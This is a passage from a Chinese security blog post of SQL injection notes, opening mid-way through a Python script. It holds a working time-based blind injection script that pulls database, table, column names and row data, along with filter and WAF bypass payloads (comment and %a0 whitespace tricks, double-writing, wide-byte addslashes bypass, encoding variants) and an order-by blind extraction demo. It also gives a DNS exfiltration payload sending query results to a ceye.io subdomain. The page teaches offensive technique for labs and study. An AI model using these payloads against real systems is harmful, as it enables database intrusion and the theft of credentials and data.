+            payload = &quot;and if(substr(length((select group_concat(column_name) from information_schema.columns where table_name=&#123;&#125;)),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(tbname,i,c)
+            if check(payload):
+                length += str(c)
+                print (length)
+    sys.stdout.write(&quot;`\r\n&quot;)
+    return int(length)
+
+def getDataLength(colName,tbName):
+    length = &#39;&#39;
+    for i in range(1,3):
+        for c in range(10):
+            payload = &quot;and if(substr(length((select group_concat(&#123;&#125;) from &#123;&#125;)),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(colName,tbName,i,c)
+            if check(payload):
+                length += str(c)
+                print (length)
+    sys.stdout.write(&quot;`\r\n&quot;)
+    return int(length)
+
+def getDatabaseName(dbLength):
+    result = &#39;&#39;
+    for i in range(1,dbLength + 1):
+        for c in s:
+            payload = &quot;and if(substr(database(),%d,1)=&#39;%c&#39;,sleep(3),1)--+&quot; % (i,c)
+            if check(payload):
+                result += c
+                break
+        print (result)
+    sys.stdout.write(&quot;`\r\n&quot;)
+
+def getTablesName(dbName,tbLength):
+    result = &#39;&#39;
+    dbName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(dbName)))
+    for i in range(1,tbLength+1):
+        for c in s:
+            payload = &quot;and if(substr((select group_concat(table_name) from information_schema.tables where table_schema=&#123;&#125;),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(dbName,i,c)
+            if check(payload):
+                result += c
+                break
+        print (result)
+    sys.stdout.write(&quot;`\r\n&quot;)
+
+def getColumnsName(tbName,coLength):
+    result = &#39;&#39;
+    tbName = &#39;0x&#39; + bytes.decode(binascii.hexlify(str.encode(tbName)))
+    for i in range(1,coLength+1):
+        for c in s:
+            payload = &quot;and if(substr((select group_concat(column_name) from information_schema.columns where table_name=&#123;&#125;),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(tbName,i,c)
+            if check(payload):
+                result += c
+                break
+        print (result)
+    sys.stdout.write(&quot;`\r\n&quot;)
+
+def getDatas(colName,tbName,dataLength):
+    result = &#39;&#39;
+    for i in range(1,dataLength+1):
+        for c in s:
+            payload = &quot;and if(substr((select group_concat(&#123;&#125;) from &#123;&#125;),&#123;&#125;,1)=&#39;&#123;&#125;&#39;,sleep(3),1)--+&quot;.format(colName,tbName,i,c)
+            if check(payload):
+                result += c
+                break
+        print (result)
+    sys.stdout.write(&quot;`\r\n&quot;)
+
+
+def exp():
+    dbLength = getDbNameLength()
+    print (&quot;database_name&#39;s length:&#123;&#125;&quot;.format(dbLength))
+    getDatabaseName(dbLength)
+    dbname = input(&#39;Find tables from :&#39;)
+    tbLength = getTableLength(dbname)
+    print (&quot;Tables_name&#39;s length:&#123;&#125;&quot;.format(tbLength))
+    getTablesName(dbname,tbLength)
+    tbname = input(&#39;Find columns from :&#39;)
+    coLength = getColumnsLength(tbname)
+    print (&quot;columns_name&#39;s length:&#123;&#125;&quot;.format(coLength))
+    getColumnsName(tbname,coLength)
+    colname = input(&#39;Find datas from :&#39;)
+    dataLength = getDataLength(colname,tbname)
+    print (&quot;data&#39;s length:&#123;&#125;&quot;.format(dataLength))
+    getDatas(colname,tbname,dataLength)
+exp()
+</code></pre>
+<h3 id="绕过技巧"><a href="#绕过技巧" class="headerlink" title="绕过技巧"></a>绕过技巧</h3><h4 id="1、绕过空格过滤"><a href="#1、绕过空格过滤" class="headerlink" title="1、绕过空格过滤"></a>1、绕过空格过滤</h4><p><strong>a.使用注释符</strong></p>
+<pre><code>/**/替代空格</code></pre>
+<p><strong>b.如果过滤了空格和注释符</strong></p>
+<pre><code>function blacklist($id)
+&#123;
+    $id= preg_replace(&#39;/or/i&#39;,&quot;&quot;, $id);            //strip out OR (non case sensitive)
+    $id= preg_replace(&#39;/and/i&#39;,&quot;&quot;, $id);        //Strip out AND (non case sensitive)
+    $id= preg_replace(&#39;/[\/\*]/&#39;,&quot;&quot;, $id);        //strip out /*
+    $id= preg_replace(&#39;/[--]/&#39;,&quot;&quot;, $id);        //Strip out --
+    $id= preg_replace(&#39;/[#]/&#39;,&quot;&quot;, $id);            //Strip out #
+    $id= preg_replace(&#39;/[\s]/&#39;,&quot;&quot;, $id);        //Strip out spaces
+    $id= preg_replace(&#39;/[\/\\\\]/&#39;,&quot;&quot;, $id);        //Strip out slashes
+    return $id;
+&#125;</code></pre>
+<p><strong>c.可以使用特殊中文字符 %a0</strong></p>
+<pre><code>id=1&#39;%a0union%a0select%a01,user(),3%a0and%a0&#39;1&#39;=&#39;1</code></pre>
+<p>这个可算是一个不成汉字的中文字符了，因为%a0的特性，在进行正则匹配时，匹配到它时是识别为中文字符的，所以不会被过滤掉，但是在进入SQL语句后，Mysql是不认中文字符的，所以直接当作空格处理，就这样，我们便达成了Bypass的目的，成功绕过空格+注释的过滤。</p>
+<p><strong>d.中文字符配合注释符</strong></p>
+<pre><code>union/*%aa*/select。
+这个不是属于/*xxx*/应该是被防护了的怎么还可以呢？这是中文字符的特性利用，中文字符配合注释符bypass 。利用%e4等只要是中文字符开头的，就可以完成绕过检测！</code></pre>
+<p><strong>e.使用括号</strong></p>
+<pre><code>seleCt (group_concat(table_name)) from (information_schema.tables) where (table_schema=database())) </code></pre>
+<p><strong>f.使用反引号</strong></p>
+<pre><code>select `database()`，可以用来过空格和正则，特殊情况下还可以将其做注释符用</code></pre>
+<h4 id="2、绕过黑名单过滤"><a href="#2、绕过黑名单过滤" class="headerlink" title="2、绕过黑名单过滤"></a>2、绕过黑名单过滤</h4><p><strong>a .双写绕过</strong></p>
+<p>waf将关键字过滤了的情况。</p>
+<pre><code>$id= preg_replace(&#39;/UNION/s&#39;,&quot;&quot;, $id); //Strip out UNION</code></pre>
+<p><strong>b.大小写绕过</strong></p>
+<p>用于大小写不敏感的过滤。</p>
+<pre><code>$id= str_replace(&#39;union&#39;,&#39;&#39;, $id);</code></pre>
+<p><strong>c.and/or的过滤</strong></p>
+<pre><code>and =&gt; &amp;&amp;
+or =&gt; ||</code></pre>
+<p><strong>d.等号/比较符的过滤</strong></p>
+<pre><code>?id=1&#39; or 1 like 1#   绕过对 = &gt; 等过滤
+or &#39;1&#39; IN (&#39;1234&#39;)#   替代=</code></pre>
+<p><strong>e.过滤了注释符</strong></p>
+<p>闭合前后引号。</p>
+<pre><code>$reg = &quot;/#/&quot;;
+$reg1 = &quot;/--/&quot;;
+$replace = &quot;&quot;;
+$id = preg_replace($reg, $replace, $id);
+$id = preg_replace($reg1, $replace, $id);
+
+$sql=&quot;SELECT * FROM users WHERE id=&#39;$id&#39; LIMIT 0,1&quot;;</code></pre>
+<pre><code>id=-1&#39; or &#39;1&#39;=&#39;1
+id=-1&#39; union select 1,database(),&#39;3</code></pre>
+<p><strong>f.函数被过滤</strong></p>
+<pre><code>等价替换：
+hex()、bin() ==&gt; ascii()
+sleep() ==&gt;benchmark()
+concat_ws()==&gt;group_concat()
+mid()、substr() ==&gt; substring()
+
+逐位比较：
+substring()和substr()被过滤：
+?id=1 and ascii(lower(mid((select pwd from users limit 1,1),1,1)))=74
+substr((select &#39;password&#39;),1,1) = 0x70
+strcmp(left(&#39;password&#39;,1), 0x69) = 1
+strcmp(left(&#39;password&#39;,1), 0x70) = 0
+strcmp(left(&#39;password&#39;,1), 0x71) = -1</code></pre>
+<p><strong>g.过滤了union/where/limit</strong></p>
+<p>每次取一个值比较。</p>
+<pre><code>id=1 &amp;&amp; (select user from users where id=1)=&#39;admin&#39;
+id=1 &amp;&amp; (select user from users limit 1) = &#39;admin&#39;
+id=1 &amp;&amp; (select user from users group by user_id having user_id = 1) = &#39;admin&#39;</code></pre>
+<h4 id="3、绕过addslashes-函数"><a href="#3、绕过addslashes-函数" class="headerlink" title="3、绕过addslashes()函数"></a>3、绕过addslashes()函数</h4><p>可以用宽字节来绕过。</p>
+<p>mysql在使用GBK编码的时候，会认为两个字符为一个汉字，例如%aa%5c就是一个汉字（前一个ascii码大于128才能到汉字的范围）。原理大概来说就是，一个双字节组成的字符，比如一个汉字‘我’的utf8编码为%E6%88%91 当我们使用?id=-1%E6’ 这样的构造时，’ 前面加的 \ 就会和%E6 合在一起，但是又不是一个正常汉字，但是起到了注掉 \ 的作用</p>
+<blockquote>
+<p> addslashes()会在单引号前加一个\ 来转义引号。</p>
+</blockquote>
+<p>绕过方法：</p>
+<p>1、宽字节使\拼接成中文字符造成转移失效</p>
+<p>2、构造 %**%5c%5c%27的情况，后面的%5c会被前面的%5c给注释掉。</p>
+<h4 id="4、绕过mysql-real-escape-string-函数"><a href="#4、绕过mysql-real-escape-string-函数" class="headerlink" title="4、绕过mysql_real_escape_string()函数"></a>4、绕过mysql_real_escape_string()函数</h4><p>mysql_real_escape_string() 函数转义 SQL 语句中使用的字符串中的特殊字符。</p>
+<p>下列字符受影响：</p>
+<pre><code>\x00
+\n
+\r
+\
+&#39;
+&quot;
+\x1a</code></pre>
+<p>如果成功，则该函数返回被转义的字符串。如果失败，则返回 false。</p>
+<p>可用<strong>宽字节</strong>绕过。</p>
+<h4 id="5、编码绕过"><a href="#5、编码绕过" class="headerlink" title="5、编码绕过"></a>5、编码绕过</h4><p>在引号或特定词被过滤时，使用urlencode，ascii(char)，hex，unicode等编码绕过</p>
+<pre><code>or 1=1                    =&gt;        %6f%72%20%31%3d%31
+/tmp/test.txt        =&gt;        char(68,58,92,116,101,115,116,46,116,120,116)
+
+十六进制
+security                =&gt;        0x7365637572697479
+
+双重编码
+?id=1%252f%252a*/UNION%252f%252a /SELECT%252f%252a*/1,2,password%252f%252a*/FROM%252f%252a*/Users--+
+
+unicode编码
+单引号：&#39;
+%u0027 %u02b9 %u02bc %u02c8 %u2032
+%uff07 %c0%27
+%c0%a7 %e0%80%a7
+空白：
+%u0020 %uff00
+%c0%20 %c0%a0 %e0%80%a0
+左括号(:
+%u0028 %uff08
+%c0%28 %c0%a8
+%e0%80%a8
+右括号):
+%u0029 %uff09
+%c0%29 %c0%a9
+%e0%80%a9</code></pre>
+<h3 id="进阶技巧"><a href="#进阶技巧" class="headerlink" title="进阶技巧"></a>进阶技巧</h3><h4 id="1、order-by的妙用"><a href="#1、order-by的妙用" class="headerlink" title="1、order by的妙用"></a>1、order by的妙用</h4><p>登陆场景：</p>
+<pre><code class="php">$username = $_POST[&#39;username&#39;];
+$password = $_POST[&#39;password&#39;];
+if(filter($username))&#123;
+    //过滤括号
+&#125;else&#123;
+    $sql=&quot;SELECT * FROM admin WHERE username=&#39;&quot;.$username.&quot;&#39;&quot;;
+    $result=mysql_query($sql);
+    @$row = mysql_fetch_array($result);
+    if(isset($row) &amp;&amp; $row[&#39;username&#39;] === &#39;admin&#39;)&#123;
+        if ($row[&#39;password&#39;]===md5($password))&#123;
+            //Login successful
+        &#125;else&#123;
+            die(&quot;password error!&quot;);
+        &#125;
+    &#125;else&#123;
+        die(&quot;username does not exist!&quot;);
+    &#125;
+&#125;</code></pre>
+<pre><code>mysql&gt; select * from users where username=&#39;admin6&#39;;
++----+----------+----------------------------------+
+| id | username | password                         |
++----+----------+----------------------------------+
+|  18 | admin6   | 51b7a76d51e70b419f60d3473fb6f900 |
++----+----------+----------------------------------+
+1 row in set (0.00 sec)</code></pre>
+<p>通过<strong>order by盲注</strong>获取password的值。</p>
+<pre><code>mysql&gt; select * from users where username=&#39;admin6&#39; union select 1,2,&#39;5&#39; order by 3;
++----+----------+----------------------+
+| id | username | password             |
++----+----------+----------------------+
+|  1 | 2        | 5                    |
+| 18 | admin6   | 51b7a76d51e70b419f60 |
++----+----------+----------------------+
+2 rows in set (0.00 sec)
+
+mysql&gt; select * from users where username=&#39;admin6&#39; union select 1,2,&#39;6&#39; order by 3;
++----+----------+----------------------+
+| id | username | password             |
++----+----------+----------------------+
+| 18 | admin6   | 51b7a76d51e70b419f60 |
+|  1 | 2        | 6                    |
++----+----------+----------------------+
+2 rows in set (0.00 sec)
+
+mysql&gt; select * from users where username=&#39;admin6&#39; union select 1,2,&#39;51&#39; order by 3;
++----+----------+----------------------+
+| id | username | password             |
++----+----------+----------------------+
+|  1 | 2        | 51                   |
+| 18 | admin6   | 51b7a76d51e70b419f60 |
++----+----------+----------------------+
+2 rows in set (0.00 sec)
+
+mysql&gt; select * from users where username=&#39;admin6&#39; union select 1,2,&#39;52&#39; order by 3;
++----+----------+----------------------+
+| id | username | password             |
++----+----------+----------------------+
+| 18 | admin6   | 51b7a76d51e70b419f60 |
+|  1 | 2        | 52                   |
++----+----------+----------------------+
+2 rows in set (0.00 sec)</code></pre>
+<p>通过上面的查询可以发现，按照password列排序时，字符的大小影响着他们的位置。通过调整我们设置的字符，找出回显内容变换的时刻来确定这一位的字符。</p>
+<h4 id="2、FUZZ"><a href="#2、FUZZ" class="headerlink" title="2、FUZZ"></a>2、FUZZ</h4><p>通过Burpsuite的Intruder模块来跑一遍FUZZ脚本，有助于确定注入点和闭合符号。</p>
+<p>附上几个FUZZ字典：</p>
+<blockquote>
+<p><a href="https://github.com/fuzzdb-project/fuzzdb" target="_blank" rel="noopener">https://github.com/fuzzdb-project/fuzzdb</a></p>
+<p><a href="https://github.com/TheKingOfDuck/fuzzDicts" target="_blank" rel="noopener">https://github.com/TheKingOfDuck/fuzzDicts</a></p>
+</blockquote>
+<h4 id="3、在盲注中使用-DNS-进行外带"><a href="#3、在盲注中使用-DNS-进行外带" class="headerlink" title="3、在盲注中使用 DNS 进行外带"></a>3、在盲注中使用 DNS 进行外带</h4><blockquote>
+<p>限制：</p>
+<p>除了Oracle 支持 windows 和 Linux 系统的攻击以外其他攻击<strong>只能在Windows环境下</strong></p>
+<p>并且数据中不能包含:~@等特殊字符。</p>
+</blockquote>
+<p>原理：</p>
+<p>因为DNS查询是可以在DNS服务器之前转发的，那么DNS报文就能从安全系统内转发出来。DNS在解析时会留下日志，通过读取多级域名的解析日志，获取请求信息。即使假设服务器不允许连接公网，如果目标主机能够解析任意域名，也能够通过 DNS 查询转发进行数据外带。而这种 DNS 外带的方式，可以使得攻击者通过从易受攻击的数据库管理系统发出特制的DNS请求，攻击者可以在另一端拦截来查看恶意SQL查询（例如管理员密码）的结果。</p>
+<p><img src="https://i.loli.net/2020/01/08/1jepZE8CDhKLMmV.png"></p>
+<p>Mysql相对于Oracle来说可利用方法单一且需要一定的条件。</p>
+<p><code>secure_file_priv</code>设置为空。</p>
+<p>示例：</p>
+<p>使用DnsLog平台：<a href="http://ceye.io/" target="_blank" rel="noopener">http://ceye.io</a></p>
+<pre><code> select load_file(concat(&#39;\\\\&#39;,(select version()),&#39;.juqh6m.ceye.io\\abc&#39;));</code></pre>
+<p><img src="https://i.loli.net/2020/01/08/NqI3KODrRvVe8A1.png"><br><img src="https://i.loli.net/2020/01/08/v34gqLR9MB1sDkF.png"></p>
+<p><strong>参考链接</strong></p>
+<blockquote>
+<p><a href="https://www.cnblogs.com/backlion/p/9721687.html" target="_blank" rel="noopener">https://www.cnblogs.com/backlion/p/9721687.html</a></p>
+<p><a href="http://p0desta.com/2018/01/28/Sqli_labs%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/" target="_blank" rel="noopener">http://p0desta.com/2018/01/28/Sqli_labs%E9%80%9A%E5%85%B3%E6%96%87%E6%A1%A3/</a></p>
+<p><a href="http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/" target="_blank" rel="noopener">http://byd.dropsec.xyz/2016/08/01/SQL-Injection%E7%BB%95%E8%BF%87%E6%8A%80%E5%B7%A7/</a></p>
+<p><a href="https://p0sec.net/index.php/archives/106/" target="_blank" rel="noopener">https://p0sec.net/index.php/archives/106/</a></p>
+<p><a href="https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf" target="_blank" rel="noopener">https://arxiv.org/ftp/arxiv/papers/1303/1303.3047.pdf</a></p>
+</blockquote>
+<h2 id="Oracle"><a href="#Oracle" class="headerlink" title="Oracle"></a>Oracle</h2><h3 id="基础知识-1"><a href="#基础知识-1" class="headerlink" title="基础知识"></a>基础知识</h3>
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">LANVNAL</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://lanvnal.com/2020/01/10/sqli-bi-ji/">https://lanvnal.com/2020/01/10/sqli-bi-ji/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">LANVNAL</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/note/">
+                                    <span class="chip bg-color">note</span>
+                                </a>
+                            
+                                <a href="/tags/Sqli/">
+                                    <span class="chip bg-color">Sqli</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,qq,wechat,weibo" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/2020/02/01/vulnhub-ba-ji-zhi-reconforce01/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/0.jpg" class="responsive-img" alt="Vulnhub靶机之ReconForce01">
+                        
+                        <span class="card-title">Vulnhub靶机之ReconForce01</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2020-02-01
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/%E9%9D%B6%E6%9C%BA/" class="post-category">
+                                    靶机
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/Vulnhub/">
+                        <span class="chip bg-color">Vulnhub</span>
+                    </a>
+                    
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">靶机</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2019/07/15/vulnhub-zico2-ba-ji/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="https://lanvnal-blog.oss-cn-qingdao.aliyuncs.com/blog-theme-pic/coverimgs/4.png" class="responsive-img" alt="Vulnhub-zico2靶机记录">
+                        
+                        <span class="card-title">Vulnhub-zico2靶机记录</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+小学期实训的任务，顺便记录一下XD
+
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2019-07-15
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            LANVNAL
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/WriteUp/">
+                        <span class="chip bg-color">WriteUp</span>
+                    </a>
+                    
+                    <a href="/tags/Vulnhub/">
+                        <span class="chip bg-color">Vulnhub</span>
+                    </a>
+                    
+                    <a href="/tags/%E9%9D%B6%E6%9C%BA/">
+                        <span class="chip bg-color">靶机</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+<!-- 代码块折行 -->
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+    <div class="container row center-align" style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            <span id="year">2017</span>
+            <a href="/about" target="_blank">LANVNAL</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+            &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                class="white-color">120.6k</span>&nbsp;字
+            
+            
+            
+            
+            
+            
+            <span id="busuanzi_container_site_pv">
+                |&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;<span id="busuanzi_value_site_pv"
+                    class="white-color"></span>&nbsp;次
+            </span>
+            
+            
+            <span id="busuanzi_container_site_uv">
+                |&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;<span id="busuanzi_value_site_uv"
+                    class="white-color"></span>&nbsp;人
+            </span>
+            
+            <br>
+            
+            <span id="sitetime">载入运行时间...</span>
+            <script>
+                function siteTime() {
+                    var seconds = 1000;
+                    var minutes = seconds * 60;
+                    var hours = minutes * 60;
+                    var days = hours * 24;
+                    var years = days * 365;
+                    var today = new Date();
+                    var startYear = "2017";
+                    var startMonth = "3";
+                    var startDate = "15";
+                    var startHour = "0";
+                    var startMinute = "0";
+                    var startSecond = "0";
+                    var todayYear = today.getFullYear();
+                    var todayMonth = today.getMonth() + 1;
+                    var todayDate = today.getDate();
+                    var todayHour = today.getHours();
+                    var todayMinute = today.getMinutes();
+                    var todaySecond = today.getSeconds();
+                    var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                    var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                    var diff = t2 - t1;
+                    var diffYears = Math.floor(diff / years);
+                    var diffDays = Math.floor((diff / days) - diffYears * 365);
+                    var diffHours = Math.floor((diff - (diffYears * 365 + diffDays) * days) / hours);
+                    var diffMinutes = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours) /
+                        minutes);
+                    var diffSeconds = Math.floor((diff - (diffYears * 365 + diffDays) * days - diffHours * hours -
+                        diffMinutes * minutes) / seconds);
+                    if (startYear == todayYear) {
+                        document.getElementById("year").innerHTML = todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffDays + " 天 " + diffHours +
+                            " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    } else {
+                        document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                        document.getElementById("sitetime").innerHTML = "本站已安全运行 " + diffYears + " 年 " + diffDays +
+                            " 天 " + diffHours + " 小时 " + diffMinutes + " 分钟 " + diffSeconds + " 秒";
+                    }
+                }
+                setInterval(siteTime, 1000);
+            </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/LANVNAL" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:lanvnal@foxmail.com" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+
+
+
+
+
+
+
+
+
+
+    <a href="/atom.xml" class="tooltipped" target="_blank" data-tooltip="RSS 订阅" data-position="top" data-delay="50">
+        <i class="fas fa-rss"></i>
+    </a>
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script src="/js/search.js"></script>
+<script type="text/javascript">
+$(function () {
+    searchFunc('/search.xml', 'searchInput', 'searchResult');
+});
+</script>
+
+    <!-- 回到顶部按钮 -->
+<div id="backTop" class="top-scroll">
+    <a class="btn-floating btn-large waves-effect waves-light" href="#!">
+        <i class="fas fa-arrow-up"></i>
+    </a>
+</div>
+
+
+    <script src="/libs/materialize/materialize.min.js"></script>
+    <script src="/libs/masonry/masonry.pkgd.min.js"></script>
+    <script src="/libs/aos/aos.js"></script>
+    <script src="/libs/scrollprogress/scrollProgress.min.js"></script>
+    <script src="/libs/lightGallery/js/lightgallery-all.min.js"></script>
+    <script src="/js/matery.js"></script>
+
+    <!-- Baidu Analytics -->
+
+    <!-- Baidu Push -->
+
+<script>
+    (function () {
+        var bp = document.createElement('script');
+        var curProtocol = window.location.protocol.split(':')[0];
+        if (curProtocol === 'https') {
+            bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+        } else {
+            bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+        }
+        var s = document.getElementsByTagName("script")[0];
+        s.parentNode.insertBefore(bp, s);
+    })();
+</script>
+
+    
+    
+    <script async src="/libs/others/busuanzi.pure.mini.js"></script>
+    
+
+    
+
+    
+
